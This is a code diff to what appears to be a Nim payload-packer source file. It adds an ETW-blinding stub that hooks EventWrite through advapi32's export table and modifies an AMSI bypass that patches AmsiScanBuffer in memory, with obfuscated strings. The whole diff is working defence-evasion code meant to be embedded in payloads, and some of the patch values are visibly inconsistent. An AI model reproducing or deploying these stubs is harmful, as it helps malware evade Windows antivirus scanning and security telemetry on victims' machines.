@@ -1,6 +1,62 @@
 import strformat
 
 
+let EATHookStub * = """
+
+proc DummyFunction(): BOOL =
+  return TRUE
+
+proc EATHook(): BOOL =
+  let advapi = LoadLibraryA("advapi32.dll")
+  if advapi == 0:
+    when defined(verbose):
+      echo "Failed to load advapi32.dll"
+    return FALSE
+
+  let dosHeader = cast[ptr IMAGE_DOS_HEADER](advapi)
+  if dosHeader.e_magic != IMAGE_DOS_SIGNATURE:
+    return FALSE
+
+  let ntHeaders = cast[ptr IMAGE_NT_HEADERS](cast[ptr BYTE](advapi) + dosHeader.e_lfanew)
+  let exportRVA = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+  if exportRVA == 0:
+    return FALSE
+
+  let exportDir = cast[ptr IMAGE_EXPORT_DIRECTORY](cast[ptr BYTE](advapi) + exportRVA)
+
+  for i in 0 ..< exportDir.NumberOfNames:
+    let nameRVA = cast[ptr DWORD](cast[ptr BYTE](advapi) + exportDir.AddressOfNames + (i * sizeof(DWORD)))
+    let currName = cast[ptr char](cast[ptr BYTE](advapi) + nameRVA[])
+    let eventWriteWide: cstring = obf("EventWrite")
+    if $currName == $eventWriteWide:
+      let ordinal = cast[ptr WORD](cast[ptr BYTE](advapi) + exportDir.AddressOfNameOrdinals + (i * sizeof(WORD)))
+      let funcRVA = cast[ptr DWORD](cast[ptr BYTE](advapi) + exportDir.AddressOfFunctions + int(cast[uint](ordinal[]) * cast[uint](4)))
+      var oldProtect: DWORD
+      var result = VirtualProtect(funcRVA, 4096, PAGE_READWRITE, addr oldProtect)
+      if result == 0:
+        when defined(verbose):
+          echo "VirtualProtect failed"
+          echo "Error code: ", GetLastError()
+        return FALSE
+
+      let originalFunc = cast[pointer](cast[ptr BYTE](advapi) + funcRVA[])
+      funcRVA[] = cast[UINT32](cast[pointer](DummyFunction)) - cast[UINT32](advapi)
+
+      var dummy: DWORD
+      VirtualProtect(funcRVA, sizeof(DWORD), oldProtect, addr dummy)
+      return TRUE
+
+  return FALSE
+
+if EATHook() == FALSE:
+  when defined(verbose):
+    echo obf("[-] Failed to hook EventWrite")
+else:
+  when defined(verbose):
+    echo obf("[+] Successfully hooked EventWrite")
+
+"""
+
 let CustomThreadEntryStubFirst * = """
 
 type
@@ -2099,9 +2155,9 @@ let AMSIPatchStub * = """
             disabled: bool = false
         
         when defined amd64:
-            let patch: array[1, byte] = [byte 0x75] # Patch to JNZ, old value was 0x74 (JNZ)
+            let patch: array[1, byte] = [byte 0x29, 0xFF] # Patch to JNZ, old value was 0x74 (JNZ)
         elif defined i386:
-            let patch: array[1, byte] = [byte 0x75]
+            let patch: array[1, byte] = [byte 0x29, 0xFF] # This is not correct but x86 wont really work in the Packer anyway here.
         
         var ModuleFileName: UNICODE_STRING
         when defined(DInvoke):
@@ -2129,11 +2185,9 @@ let AMSIPatchStub * = """
                 echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
             return disabled
         when defined amd64:
-            cs = cs + 0x6D # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
-            #cs = cs + 0x83 # Old value for Win10 to change JNZ to JZ. Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+            cs = cs + 0x1B
         else:
-            #cs = cs + 0x75 # old value
-            cs = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
+            cs = cs + 0x1B # This is not correct but x86 wont really work anyway here.
         var oldProtection: DWORD = 0
         var success: BOOL
         var protectAddress = cs
